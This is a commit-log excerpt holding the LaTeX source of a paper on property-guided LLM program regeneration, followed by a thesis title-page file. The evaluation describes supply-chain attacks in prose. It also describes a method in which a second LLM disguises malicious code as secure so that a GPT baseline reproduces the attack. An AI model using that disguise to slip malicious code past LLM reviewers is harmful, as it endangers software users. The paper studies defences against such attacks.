-Consider a JavaScript application that retrieves and displays a user's music
-collection from an SQLite database~\cite{codewithsadeemusicplayer, beets}:
-
-\begin{minted}[frame=lines]{js}
-function getAlbumsByArtist(artist) {
-  const db = new Database("music.db");
-  const rows = db.prepare("SELECT album
-  FROM songs WHERE artist = ?").all(artist);
-  return rows.map(row => row.album); }
-\end{minted}
-
-Having the database initialization being in the same function as 
-the database access has architectural and performance implications.
-In addition, there exist systems that can benefit from further decomposition
-of an application towards automatic distribution, parallelization or security~\cite{Towards_Modern_Ghemaw_2023, vasilakis2019ignis, vasilakis2018breakapp}.
-\begin{wrapfigure}[5]{r}{.7\columnwidth}
-  \vspace{-10pt}
-  \begin{minted}{prolog}
-db('music.db').
-equal(trace(P,sql),trace(P_,sql)).
-func(F1). func(F2).
-equal(F2(F1, _), P).
-\end{minted}
-\end{wrapfigure}
-\sys, given the query to the right, will 
-generate program that consists of two functions,
-whose composition is equivalent to the original program, and feature 
-the same I/O and trace properties (a trace here being the sequence of SQL 
-queries transmitted to the database).
-\sys wraps the node process with monitors that extract the SQL queries 
-sent to the database for 24 generated inputs.
-Then, after 20.4 seconds and two attempts, it arrives at two functions $f_1$, and 
-$f_2$, where their composition $f_2(f_1, \_)$, is equivalent to the original \ttt{getAlbumsByArtist} function across these inputs.
-A final processing step renames functions $f_1$ and $f_2$ by prompting an LLM instance.
-Alternatively, the user could have provided specific signatures and names for each 
-functions as an additional guiding property.
-The resulting program is:
-\begin{minted}[frame=lines]{js}
-function connectDB() {
- const sqlite = require('sqlite');
- return sqlite.open({filename: 'music.db'}); }
-function getAlbumsByArtist(db, artist) {
- const rows = await db.all("SELECT album
- FROM songs WHERE artist = ?", artist);
- return rows.map(row => row.album); }
-\end{minted}
-
-% \heading{Key results}
-% \sys is able to effectively transform programs across a variety goals.
-
-\section{\sys Design}
-\label{sec:design}
-
-% \sys is a system for program regeneration: given an input program and a set of
-% behavioral, structural, or syntactic properties, it synthesizes a new program
-% that satisfies a specified subset of those properties. The system treats
-% regeneration as a goal-driven process, guided by explicit property
-% specifications and a symbolic planner that structures the search space for a
-% backend synthesizer.
-At a high level, \sys operates in four phases: (1) plan construction, (2)
-property extraction, (3) program synthesis, and (4) verification and feedback.
-These phases interact through a shared representation of the program and its
-transformation goals.
-
-\heading{Plan construction}
-First, each of the available plugins contributes a set of pre and pos-conditions 
-to the logic engine.
-Essentially, these describe what needs to hold for an analysis to be applicable to the given 
-program and what properties \sys will preserve or transform after regeneration.
-Then, the planning component accepts one or more user-provided regeneration goals (termed as the query).
-The full set of rules and predicates are used to construct an ASP program
-a solver then accepts.
-From the solver's output, the planner constructs a plan that specifies which
-analysies \sys plugins should apply to the input program and what properties can be
-preserved during regeneration in order to fullfill the query.
-
-\heading{Property extraction} \sys then continues by analyzing the input program to
-extract the collection of properties.
-These may describe the program's interface
-(\eg, exported functions), its operational constraints (\eg, disallowing
-filesystem access), or its structure (\eg, use of a particular API or programming idiom).
-While some properties are derived from generic analyses
-applicable across languages~(\eg examples of input-output behavior), others are specific to the input program's language and runtime model.
-
-\heading{Synthesis}
-Guided by the transformation plan, \sys creates a prompt template which is then
-augmented with the extracted properties, having them normalized to a human-readable text represantation.
-This prompt is then passed to an LLM instance.
-\sys does not include by default the original program's source code in the prompt.
-Instead, it uses the extracted properties to guide the LLM instance 
-to synthesize a candidate program that satisfies the specified constraints.
-
-\heading{Verification and feedback}
-The final phase verifies that the
-synthesized program satisfies the target properties.
-If verification fails---due to a violated constraint or behavioral divergence---\sys uses this
-failure as a signal to refine the plan or resample the synthesis step.
-This forms a feedback loop: planning, synthesis, and verification interact until \sys
-produces a satisfactory program or the system exhausts its search.
-
-\section{Property Language and Extraction}
-\label{sec:dsl}
-
-\sys represents program characteristics as symbolic \emph{properties}, drawn from a language of first-order predicates.
-These properties describe aspects of the input program and serve as regeneration constraints for the output.
-They form the basis of both planning and verification.
-All aspects of the symbolic representation are expressed as answer-set programming (ASP) facts and rules (an example program is shown in \cref{lst:logic-example})~\cite{Eiter_2009}.
-
-\heading{Property predicates}
-Each property is a logical predicate over the program symbol $p$. Common examples include:
-\begin{itemize}
-  \item \texttt{language}$(p, \texttt{javascript})$: the input program is written in JavaScript.
-  \item \texttt{signature}$(p)$: the program exposes a well-formed function signature.
-  \item \texttt{pure}$(p)$: the program does not have side-effects (\eg file system access, network calls, \etc).
-\end{itemize}
-
-Properties fall into three categories:
-\begin{itemize}
-  \item $\mathsf{goal}(X)$: the user requires $X$ to hold in the regenerated program. The system derives such facts from the user query.
-  \item $\mathsf{can}(X)$: the system is capable of extracting or inferring property $X$ from the input. Plugins add these facts and represent the system's capabilities.
-  \item $\mathsf{do}(X)$: $X$ the planner selects $X$ for enforcement and the synthesizer will preserve or regenerate it. 
-\end{itemize}
-
-\heading{Planning over properties}
-The logic engine determines the set of active properties to enforce by solving a constrained optimization problem over $\mathsf{do}(\cdot)$. It satisfies the following constraints:
-\begin{align*}
-  \mathsf{goal}(X) &\Rightarrow \mathsf{do}(X) &\text{Satisfy all goals} \\
-  \mathsf{do}(X) &\Leftarrow \mathsf{can}(X) &\text{Apply only extractable properties}
-\end{align*}
-\sys also supports minimization, maximization and elimination of properties
-through the $\mathsf{goal\_min}$, $\mathsf{goal\_max}$, and $\mathsf{goal\_not}$ and the corresponding $\mathsf{do\_min}$, $\mathsf{do\_max}$, and $\mathsf{do\_not}$ predicates.
-Without loss of generality, the text encompasses the four cases under $\mathsf{goal}$ and $\mathsf{do}$, explicitly mentioning the rest when there is an important semantic difference.
-
-Additionally, the system maximizes the number of extracted properties:
-\[
-\text{maximize} \left|\left\{ X \mid \mathsf{do}(X) \right\}\right|
-\]
-Essentially, the planner tries to give the synthesizer as much information
-as possible, as long as it doesn't violate any regeneration goals.
-
-\heading{Plugin-defined rules}
-Plugins contribute domain-specific inference rules and constraints. For example, a plugin for JavaScript-to-Haskell translation may define:
-\begin{align*}
-\mathsf{can}(\texttt{translate}_{\texttt{js} \rightarrow \texttt{hs}}(p)) & \\
-\mathsf{do}(\texttt{translate}_{\texttt{js} \rightarrow \texttt{hs}}(p)) &\Rightarrow \mathsf{do}(\texttt{language}(p, \texttt{haskell})) \\
-\mathsf{do}(\texttt{translate}_{\texttt{js} \rightarrow \texttt{hs}}(p)) &\Rightarrow \mathsf{language}(p, \texttt{javascript})
-\end{align*}
-Another plugin might contribute $\mathsf{can}(\texttt{signature}(p))$, indicating it can extract the function signature.
-At this stage, \sys only cares about semantics of each plugin in relation to how it might enable or violate
-other properties in the regenerated program.
-
-\heading{Axioms and domain knowledge}
-The logic engine also includes domain-wide axioms based on some common assumptions.
-For example
-$\mathsf{do}(\texttt{language}(p, \texttt{haskell})) \Rightarrow \mathsf{do}(\texttt{pure}(p))$
-captures the assumption that programs written in Haskell are pure by default.
-Such axioms allow inferred properties to trigger downstream constraints or synthesis behaviors.
-
-\begin{listing}
-  \begin{minted}[frame=lines, fontsize=\small]{prolog}
-language(p, c).
-can(len(p)). % len plugin
-can(signature(p)). % signature plugin
-can(js2hs(p)). % js2hs plugin
-do(language(p, haskell)) :- do(js2hs(p)).
-:- do(js2hs(p)), not language(p, javascript).
-
-% Core solver logic
-:- do(language(p, X)), language(p, Y), X != Y,
-    not goal(language(p, X)).
-{ do(X) } :- can(X), not goal_min(X).
-{ do_min(X) } :- can(X).
-ndo(N) :- N = #count { X : do(X) }.
-#maximize { N : ndo(N) }.
-:- goal(X), not do(X).
-:- goal_min(X), not do_min(X).
-:- do(language(P, L1)), do(language(P, L2)), L1 != L2.
-
-goal_min(len(p)). % User query
-\end{minted}
-  \caption{\textbf{Example \sys logic program.}
-  This is a lightly simplified version of the logic program that produces the plan for the idiomatization task~(\cref{sec:example}). 
-  The program contains facts coming from (1) the input program (written in C),
-  (2) three plugins (\ttt{len}, \ttt{signature}, and \ttt{javascript2haskell}),
-  (3) axioms from the logic engine (\eg a program can have one language, an analysis will be applied only if possible, all goals must be satisfied), and
-  (4) the user query (the user wants to minimize the length of the program).
-  }
-  \label{lst:logic-example}
-\end{listing}
-
-\heading{Extensibility}
-\sys decentralizes property extraction: plugins contribute $\mathsf{can}(\cdot)$ facts, and pre- and post-conditions, while the core planner resolves which properties to enforce based on goals, capabilities, and axioms.
-This modularity allows language-specific analyses to coexist with general-purpose reasoning in a unified planning layer.
-
-\section{Synthesis Plan}
-\label{sec:synthesis}
-
-The synthesis process begins with a set of enforced properties $\{ X \mid \mathsf{do}(X) \}$
-which the planner selected~(\cref{sec:dsl}).
-These properties
-reflect both user goals (\eg removing side effects, translating to a
-different language) and structural characteristics of the input program that
-the synthesizer will preserve.
-The planner constructs a transformation plan that
-specifies, for each relevant unit of code (typically a function), what
-constraints must hold in the regenerated version.
-
-For instance, a plan for regenerating a specific function $f$ might include:
-\(\mathsf{do}(\texttt{language}(f, \texttt{haskell}))\) the function must be written in Haskell, 
-\(\mathsf{do}(\texttt{pure}(f))\) the function must be side-effect-free, and 
-\(\mathsf{do}(\texttt{signature}(f))\) the function must keep its signature.
-
-\heading{LLM-guided regeneration}
-A structured prompt guides the language model, which performs the synthesis task.
-The prompt is a composition of natural-language text fragments plugins contribute. 
-A plugin can include domain-specific instructions as further guidance.
-For example:
-A \ttt{signature} plugin may contribute:
-
- \promptbox{
-   {The output should implement a function \texttt{sqrt(n: float): float}.}
- }
-A \ttt{length} plugin combined with a minimization goal may prepend:
-
-\promptbox{
-  {The output should be as short as possible while preserving the original functionality.}
-}
-A \ttt{javascript2haskell} plugin may prepend:
-
-\promptbox{
-  {The output function should be written in Haskell.}
-}
-
-These fragments, combined with a normalized text representations of each of 
-the extracted properties constitute the prompt given to the LLM.
-
-\heading{Constraint-guided generation}
-While \sys delegates code synthesis to a large language model, the planner constrains the generation space in two key ways.
-First, the prompt instructs the LLM to perform only transformations that are valid under the current plan.
-For instance, if the target function must be pure, the prompt will exclude information such as system-call traces that might imply side-effectful behavior.
-Second, candidate outputs are verified post hoc against the enforced properties~(\cref{sec:verification}).
-% This hybrid model balances flexibility with rigor: the LLM provides diversity and fluency, while the planner ensures adherence to property-based constraints.
-
-\section{Property Verification and Feedback Loop}
-\label{sec:verification}
-
-To validate that a regenerated program satisfies the intended goals, \sys includes an explicit verification phase that checks whether the output adheres to the enforced properties in the synthesis plan.
-Verification accepts only programs that meet the plan's constraints and provides feedback for refining or retrying those that do not.
-
-\heading{Verification as property checking}
-After synthesis, \sys invokes a set of property-specific checkers.
-Each checker is responsible for evaluating whether a property $X$ in $\mathsf{do}(X)$ holds for the regenerated program fragment.
-These checkers operate at varying levels of precision---ranging from structural pattern checks to light static or symbolic analysis---and are tailored to the property type.
-
-Examples include:
-\begin{itemize}
-  \item For $\mathsf{do}(\texttt{no\_network}(f))$, the checker confirms the absence of known network APIs or imports.
-  \item For $\mathsf{do}(\texttt{signature}(f))$, the checker matches the regenerated function's name, parameters, and arity against the extracted signature.
-  \item For $\mathsf{do}(\texttt{pure}(f))$, the checker examines control flow and side-effecting operations to detect possible violations.
-\end{itemize}
-
-Checkers are modular and contributed by plugins. Their combined results determine whether a candidate is considered valid under the current plan.
-For minimization and maximization goals, the verification phase uses the less-than or greater-than operators as are defined internally by the plugin verifying the given property.
-Verfication in this case checks if the property's value has decreased or increased compared 
-to the previous regeneration attempt.
-If the value remains unchanged for two consecutive attempts, its considered satisfied.
-
-\heading{Failure-driven refinement}
-When a candidate fails verification, \sys treats this as a feedback signal.
-Instead of discarding the regeneration attempt wholesale, the system uses the failure to revise or re-execute the synthesis phase.
-Some forms are:
-\begin{itemize}
-  \item \emph{Retrying synthesis}: A fresh LLM call with the same plan but a different generation path.
-  \item \emph{Feedback loop}: \sys will provide the previous regeneration attempt 
-    as an additional context to the LLM, together with an explanation of the properties that the regeneration violates, prompting it to adapt its output based on prior failures.
-    This mode is only activated if the verifier knows that the output will not to taint
-    followupp regeneration attempts.
-  \item \emph{Fallback handling}: If a function repeatedly fails validation, \sys may leave the original version intact or mark it for manual inspection.
-\end{itemize}
-
-% This loop provides adaptability: regeneration is not expected to succeed unconditionally, but rather to proceed incrementally under interpretable, bounded failure modes.
-
-\heading{Partial regeneration and composition}
-\sys supports regeneration at the granularity of individual functions.
-If only a subset of functions can be successfully regenerated under the given constraints, the remaining ones remain unchanged after regeneration.
-The output program thus consists of a composition of validated regenerated units and untouched originals.
-This model supports application in real-world codebases, where partial improvement (\eg replacing unsafe or deprecated functions) can be meaningful even without complete coverage.
-
-\section{Evaluation}
-\label{sec:evaluation}
-
-We evaluate \sys along three axes:
-
-\begin{itemize}
-  \item[\textbf{Q1}] \textbf{Correctness and Regeneration Quality}: Does \sys preserve program behavior and produce high-quality programs?
-  \item[\textbf{Q2}] \textbf{LLM Baseline}: How does \sys compare to naively prompting a large language model?
-  \item[\textbf{Q3}] \textbf{Planning Efficiency \& Precision}: Does minimizing extracted properties help regeneration succeed faster and more reliably?
-    % TODO: Maybe make naive LLM Q3 and merge Q3 and Q2.
-\end{itemize}
-
-\subsection{Benchmarks \& Methodology}
-
-We evaluate \sys on six benchmark suites, summarized in \cref{tab:benchmarks}.
-Each task consists of an input program, a \sys query expressing desired
-properties, and a test suite or functional oracle.
-The Rosetta Code~\cite{rosettacode} benchmarks include four programming tasks written in four different
-languages each (Python, JavaScript, C, and Haskell). 
-These include classic programs that do not require any language-specific features to implement.
-These are: the classic \emph{Hello, World!} program as found in most programming tutorials,
-a program that applies the ROT-13 cipher to a string,
-a program that computes the median of a list of numbers,
-and a program that reads a file and prints its contents to the console line-by-line.
-The npm benchmark includes ten popular (100.000+ weekly downloads) npm packages that implement utility
-functionality such as string manipulation, data structure transformations, and math.
-Similalry, the PyPi utilities benchmark includes three functions sourced from PyPi that implement similar functionality.
-The SSCA dataset includes three sneaky supply-chain attacks that obfuscate malicious behavior in otherwise innocuous-looking code.
-The attack activates under specific environment conditions, such as the presence of a specific environment variable or specific inputs
-getting passed to the program.
-The attacks involve private key exfiltration~\cite{ohm2020backstabber}, Bitcoin private key theft~\cite{ev:eurosec:2022}, and an SSH backdoor installation~\cite{copeland2019frightening}.
-and occur while the program still performs its advertised functionality.
-The IOCCC benchmark includes two programs from the International Obfuscated C Code Contest (IOCCC)~\cite{ioccc}.
-These programs are intentionally obfuscated, using advanced techniques such as bit manipulation, undefined behavior,
-and exploitation of the C preprocessor and the lax parsing rules of the C language.
-These programs perform mathematical computations like mersense primality testing and adding two numbers.
-Finally, the microbenchmarks include three programs that implement the regeneration tasks discussed in \cref{sec:example}.
-
-\begin{table}[h]
-\centering
-  \caption{\textbf{Benchmark summary}. 
-  Benchmark programs come from online repositories, public archives, security research datasets, and often referenced examples in programming culture.
-  The $N$ column shows the number of programs/functions from each benchmar.
-  }
-\begin{tabular}{llrl}
-\toprule
-Benchmark                          & Description         & $N$ & Source \\
-\midrule
-Rosetta Code                       & Programming tasks   & 16   & \cite{rosettacode} \\
-npm utilities                      & Utilities from npm  & 10  & \cite{regbench2025} \\
-PyPi utilities                   & Utilities from PyPi & 3   & \cite{regbench2025} \\
-SSCA                               & Sneaky SSAs         & 3   & \cite{ev:eurosec:2022, ohm2020backstabber,copeland2019frightening} \\
-IOCCC                              & Obfuscated C code   & 2   & \cite{ioccc} \\
-Microbenchmarks                    &                     & 3   & \\
-\hspace{.5em} \ttt{flatmap-stream} & Secure regeneration &     & \cite{es1}  \\
-\hspace{.5em} \ttt{Q\_rsqrt}       & C refactoring       &     & \cite{fast_inv_sqrt}  \\
-\hspace{.5em} \textsf{rigidDB}     & Modularization      &     & \cite{codewithsadeemusicplayer} \\
-\bottomrule
-\end{tabular}
-\label{tab:benchmarks}
-\end{table}
-
-\subsection{Q1: Correctness and Regeneration Quality}
-
-We evaluate correctness using developer-made test suites 
-shipped with the original software components as well as by manually inspecting
-the regenerated source code and report on correctness and the other query target metrics.
-When no test suite is available, we only do manual inspection.
-
-\begin{table}[h]
-  \centering
-  \caption{Correctness: Percentage of tasks passing all tests (when present) and manual inspection.}
-  \begin{tabular}{lc}
-    \toprule
-    Benchmark & \sys Pass Rate \\ 
-    \midrule
-    Rosetta Code & 16/16  \\
-    npm Utilities & 10/10 \\
-    Python Utilities & 3/3\\
-    SSCA & 3/3  \\
-    IOCCC & 1/2 \\
-    Microbenchmarks & 2.5/3  \\
-    \bottomrule
-  \end{tabular}
-\end{table}
-
-\sys succeeds in all of the Rosetta Code benchmarks, code is correct, we had to manually verify it as no test cases are available.
-\sys regenerates correctly all npm and PyPi utilities, it does not introduce and sideffectful or malicious behavior.
-The synthesized programs reveal several interesting insights and patterns.
-\sys-generated code often lacks the optimizations commonly
-implemented by library developers, such as early exits or caching.
-For instance, the \texttt{left-pad} library, precomputes padding for strings below a certain length
-and returns it directly. In contrast, \sys tends to produce straightforward
-implementations without attempting similar optimizations.
-\sys also omits domain-specific knowledge.
-For example, in the \texttt{is} family of libraries,
-\sys-generated code frequently fails to account for all edge cases,
-and often misses JavaScript-specific patterns,
-such as checking an object’s string representation to decide if an object is circular, as in the \texttt{is-circular} library.
-\sys has weak performance on libraries that involve complex regexes or perform non-trivial math.
-For the SSCA benchmarks, \sys successfully regenerates all three malicious libraries, removing the malicious behavior while preserving the original functionality.
-For the flatmap-stream attack, \sys uses some domain-specific logic (encoded in its knowledge-base by the \ttt{js-stream} plugin) to generate a function that produces a node \ttt{Stream} object.
-For the IOCCC benchmarks, \sys regenerates the \ttt{adder} program, which is a simple program that adds two numbers,
-it also regenerates \ttt{mersenne} in regards that it correctly performs a naive mersenne primality testing, but it does not follow the non-obvious output scheme of the original program, which returns a non-zero hexadecimal number when $2^p - 1$ ($p$ being the input number) is not prime.
-For the microbenchmarks, \sys correctly regenerates the \ttt{flatmap-stream} program, producing a safe Haskell version that is idiomatic and preserves the original functionality.
-However, this version does not match exactly the semantics of the original one, as it operates over infinitely nested lists, rather than only one level deep ones.
-The \ttt{Q\_rsqrt} program includes the obvious, idiomatic computation of the inverse square root ($1/\sqrt{x}$) rather than the original bit-level manipulation.
-Finally, \sys successfully decomposes the \ttt{rigidDB} program into two
-functions, \ttt{setupDatabase} and \ttt{getAlbumsByArtist}, which is a
-modularization that preserves the original functionality and produce equivalent I/O and SQL traces.
-
-\sys is able to regenerate programs that are correct and preserve the original functionality,
-while also removing any malicious behavior or obfuscation.
-Failure cases highlight current limitations, and inspire future work~(\cref{sec:discussion}).
-
-\subsection{Q2: Naive LLM vs. \sys}
-
-To compare \sys against a baseline, we use a \gptmodel instance
-that performs prompt-only rewriting without explicit access to guiding properties.
-The LLM gets the following prompt template:
-
-\promptbox{
-  \emph{Task description} \eg {Give back the same code having removed any vulnuerabilities}\\
-
-  Program:\\
-  \emph{Program/function source code}\\
-
-  Please return the program's source code after performing the task.
-}
-
-For the Rosetta Code benchmarks, \gptmodel 
-succesful in all language translation tasks.
-The original and LLM-generated code matches the semantics
-of the original one, confirmed after manually inspecting the generated code.
-Similarly, the LLM was succesful in transforming the npm and PyPi utilities towards
-removing any vulnerabilities from them, as they are benign and the transformation
-involved the LLM simply repeating the original code without any changes.
-The SSCA benchmark tasks are more interesting, as they involve 
-malicious code. For the malicious libraries, we provide the LLM 
-with two different versions. One is the original high-profile attack that appeared on npm,
-with the second one being an attack that is semantically equivalent but with the source 
-having gone through an iterative loop where a second LLM is tasked with making the code ostensibly 
-secure. This involves adding integrity checks at all points in the program where a value is used.
-\gptmodel was succesful in eliminating the original attacks, but failed in \emph{all} 
-cases where the source code was particulalry crafted to appear secure, regenerating both 
-the original functionality and the attack.
-For the IOCCC benchmarks, \gptmodel also fails 
-in both cases to regenerate the programs in a way where the code's 
-functionality is preserved while removing the obfuscation.
-The \ttt{adder} program is regenerated as a program that prints the \ttt{argc} argument, 
-while the \ttt{mersenne} program performs irrelevant arithmetic operations that 
-resemble the original source, and fails to even compile.
-For the microbenchmarks, \gptmodel is able to regenerate the \ttt{flatmap-stream} program, but fails to produce a Haskell version of it,
-as it overfits to the original JavaScript source code which uses the \ttt{Stream} API,
-and fails to produce a Haskell program that is nor equivalent to the original, nor idiomatic.
-For the \ttt{Q\_rsqrt} program, \gptmodel fails to produces a program that idiomatically 
-computes the inverse square root, rather trying to minimize the number of lines in the program
-by removing constants and comments and still keeping the bit-level manipulation.
-Finally, for the \ttt{rigidDB} program, \gptmodel is able to decompose the original program into two functions
-and names them \ttt{setupDatabase} and \ttt{getAlbumsByArtist}.
-
-\sys consistently outperforms a \gptmodel baseline,
-highlighting the inherent weaknesses of a purely prompt-based approach.
-
-\subsection{Q3: Planning Efficiency \& Precision}
-
-To evaluate the impact of \sys's property planning, we compare it against a \gptmodel baseline that performs prompt-only rewriting without explicit access to guiding properties.
-
-We consider two criteria for each regenerated program:
-
-\begin{itemize}
-  \item \textbf{Wanted Property Satisfaction:} Does the output program satisfy all positive properties declared in the query (\eg \texttt{pure}, \texttt{language(haskell)})?
-  \item \textbf{Unwanted Property Avoidance:} Does the output avoid introducing disallowed behaviors (\eg side effects, global state, unsupported language features)?
-\end{itemize}
-
-\sys consistently satisfies more of the declared properties while avoiding
-unintended behaviors. For instance, in the \texttt{flatmap-stream} benchmark,
-\gptmodel often inclduded malicious side effects when the code appeared innocuous,
-whereas \sys generated pure rewrites by treating the source as
-untrusted and grounding regeneration in I/O behavior alone.
-Across all benchmarks, the planning step completes in under 50ms on average.
-Similalry, in the \ttt{Q\_rsqrt} benchmark, \gptmodel often produces bit-level
-manipulations that are not idiomatic in Haskell, while \sys generates a simple
-and idiomatic Haskell function that computes the inverse square root.
-This is guided by the fact the \sys extracts and provides to its backend model only the function signature 
-and length of the program, which it minimizes, without including the original source code,
-which as shown in the experimental results makes the model overfit its regeneration to it.
-\sys's I/O pair extraction also provides confidence that 
-the regenerated program has the same client-visible behavior as the original one, while 
-prompting a model like \gptmodel would always require manual inspection or the presence 
-of developer tests to verify the correctness of the regeneration.
-
-These results support the claim that \sys's planning logic---driven by explicit
-property extraction and knowledge-base reasoning---yields safer and more
-controllable transformations than prompt-only LLM-based systems.
-
-\section{Related Work}
-
-\heading{Program synthesis}
-Program synthesis research spans a rich space of techniques.
-Classical techniques emphasize correctness and
-interpretability, synthesizing programs from specifications~\cite{alur2013syntax, feser2015synthesizing, gulwani2011automating},
-type constraints \cite{polikarpova2016program},
-or examples \cite{jha2010oracle, raza2018disjunctive, singh2016blinkfill}.
-These works often target narrowly
-defined domains such as string manipulation~\cite{harp:ccs:2021} or data migration
-\cite{yaghmazadeh2018automated} and focus on ensuring provable guarantees.
-More recently, LLM-based methods~\cite{austin2021program, chen2021evaluating}
-explore broad-domain code generation via prompt-based conditioning.
-While flexible, these models are prone to hallucination and struggle
-with reasoning under negation or satisfying structured constraints~\cite{xu2023llmfoolitselfpromptbased, wu2023deceptpromptexploitingllmdrivencode,jiang2024llmsdreamelephantswhen,hwang2024thinkpinkelephant}.
-
-\sys leverages insights from both these paradigms.
-Unlike purely symbolic or purely neural approaches, it leverages LLMs within a
-constrained planning framework to guide transformations while remaining
-responsive to property-based requirements.
-This design combines
-the scalability of LLM-assisted program sysnthesis with the controllability and robustness of symbolic
-reasoning. % TODO: focus on that \sys focuses on this specific problem domain
-
-\heading{Program transformations and refactoring}
-The evolution and maintenance of software systems often involve transformations
-such as refactoring, translation, or security hardening. Foundational work on
-refactoring~\cite{Fowler99} and its taxonomy~\cite{Mens04} characterizes the
-space of behavior-preserving modifications. More recent perspectives emphasize
-developer experience and usability, particularly in the context of APIs~\cite{Myers16}.
-
-Tools in this space often operate via syntax-tree transformations or
-domain-specific templates. Verification-based methods such as \textsc{Dafny}
-\cite{Leino10} and \textsc{CBMC} \cite{Clarke04} ensure functional correctness
-but require heavy formalization.
-Others automate migration via
-programming-by-example or interactive guidance \cite{gulwani2017program, le2017interactive}.
-
-Kvasir aims to generalize this landscape by treating transformations as
-goal-directed regenerations---rather than prescriptive rewrites, driven by
-properties such as program behaviors and architectural goals, expressed declaratively.
-
-\heading{Logic programming and constraint solving}
-Logic programming has long served as a foundation for reasoning in programming
-tools, offering a declarative model for expressing properties and constraints.
-Answer Set Programming (ASP), in particular, provides a rich framework for
-expressing defaults, exceptions, and optimization via stable model semantics
-\cite{Gelfond_2000, Gelfond_2002, Eiter_2009}. 
-ASP has been used for
-declarative program analysis \cite{benton2007interactive}, automated planning
-\cite{nguyen2020explainable, son2022answersetplanningsurvey}, and knowledge
-representation in verification and synthesis pipelines.
-
-\sys uses ASP as its planning back-end for the planning, decision-making
-process, while also uses its straighftorward optimization capabilities.
-For each transformation task, \sys formulates the property-satisfaction problem as a logic query and uses an ASP solver to
-synthesize a feasible transformation plans.
-This enables global reasoning across program components and enforces
-user-specified constraints that are difficult for neural models to respect.
-In addition, it offers a level of explainability that is useful in case transformations end up incorrect.
-
-\section{Discussion and Limitations}
-\label{sec:discussion}
-
-\sys supports property-guided regeneration of program fragments, with a particular focus on function-level rewrites.
-Its strength lies in combining symbolic reasoning and generative synthesis in a modular and interpretable framework.
-However, this design comes with inherent tradeoffs.
-
-\heading{Targeted regeneration}
-\sys is best used as a surgical tool for targeted regeneration tasks, not for whole-program synthesis or full language migration.
-It operates most effectively on localized units of code---such as individual functions, methods, or small modules, where behavior is self-contained and transformation goals can be expressed through explicit constraints.
-% Typical applications include rewriting high-risk, deprecated, or poorly understood code segments where correctness is critical and semantic preservation is essential.
-Broad, untargeted use may yield incomplete results and can be bottlenecked by the limited context of the back-end model \sys uses.
-
-\heading{Dependence on property specification}
-The system relies heavily on the quality and granularity of extracted or declared properties.
-In cases where desired behaviors cannot be easily expressed using available predicates, or where plugins fail to extract meaningful constraints, the regeneration plan may be under-constrained, leading to brittle or incorrect outputs.
-The framework is extensible, but each new property class requires the development of a new plugin that will provide a set of pre- and post-conditions, an extractor, and a verifier.
-
-\heading{Trust model and correctness}
-\sys
-does not provide formal guarantees
-of semantic equivalence
-to the original program.
-Instead,
-correctness is defined relative to a set of enforced properties.
-This means that correctness is only as strong as the property definitions and associated verifiers.
-In the presence of underspecified or unverifiable goals,
-regenerated code
-may exhibit unanticipated behavior,
-even if it passes all checks.
-
-\heading{LLM limitations}
-The generative synthesis phase
-is subject to the inherent variability and failure modes
-of large language models.
-These include hallucinations,
-sensitivity to prompt phrasing,
-and inconsistency
-under minor input changes.
-\sys does not mitigate these risks,
-but allows their detection
-through post-hoc verification.
-In cases where the system finds no satisfactory candidate,
-regeneration fails.
-
-\heading{Language-specific support}
-Although some components of \sys are language-agnostic (\eg logic-based planning),
-others---particularly extraction and verification plugins are not.
-Supporting a new language
-requires implementing language-specific analyzers and constraints.
-This modularity is deliberate,
-but it does limit out-of-the-box generality.
-Work on a unified language representation~\cite{koppel2018onetool,bap2011,dillig2009sail},
-is relevant to overcomming this limitation.
-The current \sys prototype
-supports Python, JavaScript, Haskell, and C.
-
-\heading{Future directions}
-Extensions that could improve \sys's capabilities include richer property languages (\eg temporal or dataflow properties~\cite{azzopardi2023ltl,handa2021orderawaredataflowmodelparallel}), tighter integration with formal verification tools, and cross-component reasoning for coordinated rewrites.
-Furthermore, performance-oriented transformations could be potent additions, allowing \sys to transform the program across dimensions like runtime, parallelizability, or memory usage.
-Additionally, integrating counterfactual generation techniques~\cite{Cabalar_2020} could help explain why certain regeneration goals are infeasible or conflicting.
-
-% Overall, \sys offers a flexible framework for controlled regeneration, but its effectiveness depends on the specificity of goals, the availability of property logic, and the scope of the transformation task.
-Its design favors composability and clarity over full automation, aiming to serve as a building block in broader refactoring, auditing, or hardening pipelines.
-
-\section{Conclusion}
-This paper introduced \sys, a system for property-guided program regeneration
-that bridges the flexibility of large language models with the precision of
-logic-driven planning.
-By allowing developers to declaratively specify
-transformation goals as logical constraints, \sys elevates LLM-assisted program
-trasnformations to a controllable, interpretable, and iterative synthesis-verification
-process.
-Evaluation demonstrates that \sys produces high-quality regenerations
-across diverse tasks, outperforming naive prompting baselines in correctness,
-controllability, and resilience to adversarial or obfuscated inputs.
-
-\sys opens the door to a new class of synthesis tools that combine symbolic
-reasoning and neural generation under a unified, extensible framework.
-As program synthesis systems grow increasingly reliant on LLMs, we believe the
-future lies in harnessing their generative power within a framework that retains
-correctness, explainability, and developer control as first-class citizens.
-
-\bibliographystyle{ACM-Reference-Format}
-\bibliography{bib.bib}
-
-\end{document}

### 2025-06-20 docs/thesis/frontmatter/frontpage.tex
Add thesis
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

\title{\thesistitle} 
\author{\thesisauthor} 
\date{\thedate}

\begin{titlepage}

\newgeometry{left=11mm,right=11mm,top=50mm,bottom=0pt}
\pagecolor{frontbackcolor}
\color{\frontpagetextcolour}

{ % Thesis title (to change see Setup/Settings.tex) 
\Huge
\begin{tabular}{p{\linewidth}}
\TitleFont{\thesistitle}   \\ 
\titlefont{\thesissubtitle} \bigskip \\ 
{\huge \documenttype} \bigskip \\
{\Large \thesisauthor~(\studentnumber)} \bigskip \\
\end{tabular}
}

% DTU department (to change see Setup/Settings.tex) 
\begin{tikzpicture}[remember picture,overlay]
\node[anchor=north east, 
      xshift=-10mm, 
      yshift=-12mm] 
      at (current page.north east) 
      {
        \color{\frontpagetextcolour}
        \begin{tabular}{r} 
        \textbf{\department} \\ 
        \departmentdescriber
        \end{tabular}
      }; 
\end{tikzpicture}

% DTU logo
\begin{tikzpicture}[remember picture,overlay]
\node[anchor=north west, 
      xshift=8.9mm, 
      yshift=-8.3mm] 
     at (current page.north west) 
     {\includegraphics[width=14.75mm,keepaspectratio]{figs/Logos/\dtulogocolour_\targetcolourmodel.pdf}}; 
\end{tikzpicture}

% Cover photo
\begin{tikzpicture}[remember picture,overlay]
\node[anchor=south, % anchor is bottom of picture
      xshift=0pt, 
      yshift=-2.9mm] % shifting picture to actually be at the bottom of the page
     at (current page.south) % placement at bottom of the page
